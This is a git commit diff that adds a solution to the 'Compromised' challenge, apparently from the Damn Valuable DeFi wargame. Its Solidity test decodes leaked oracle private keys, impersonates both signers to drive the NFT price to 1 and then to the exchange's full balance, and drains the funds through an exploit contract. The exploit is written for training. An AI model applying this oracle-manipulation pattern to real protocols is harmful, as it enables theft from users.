a5c386dc4b9552868a761583a8ece48a7e8db665
Darren Jensen <darren.jensen@gmail.com>
2024-09-15 22:05:27 +0700

    completed solution for Compromised

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {CompromisedExploit}  from "./CompromisedExploit.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +76,64 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        /*
+
+            Given the leaked data we can use the terminal to convert this to base64 encoded ascii and then decode this to a hex private key like so:
+
+            Leaked data 1: 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
+
+            cast to-ascii 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
+            echo MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0 | base64 --decode
+            cast wallet address 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+            0x188Ea627E3531Db590e6f1D71ED83628d1933088
+
+            Leaked data 2: 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
+
+            cast to-ascii 4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535
+            echo MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5 | base64 --decode
+            cast wallet address 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+            0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+
+        */
+
+        // use the leaked private keys to create two oracle signers
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address signer1 = vm.addr(pk1); // oracle source address 1
+        address signer2 = vm.addr(pk2); // oracle source address 2
+
+        // deployu the exploit contract
+        CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+
+        // set the price real low!
+        vm.prank(signer1);
+        oracle.postPrice(symbols[0], 1);
+
+        vm.prank(signer2);
+        oracle.postPrice(symbols[0], 1);
+
+        // now buy with the exploit contract
+        exploit.buy();
+
+        // now set the price to as high as possible which will be the entire ETH balance of the exchange!
+        vm.prank(signer1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        vm.prank(signer2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        // now sell with the exploit contract
+        exploit.sell();
+
+        // reset the prices back to how they were before
+        vm.prank(signer1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(signer2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         
+        // send the funds from the exploit contract to the recovery account
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
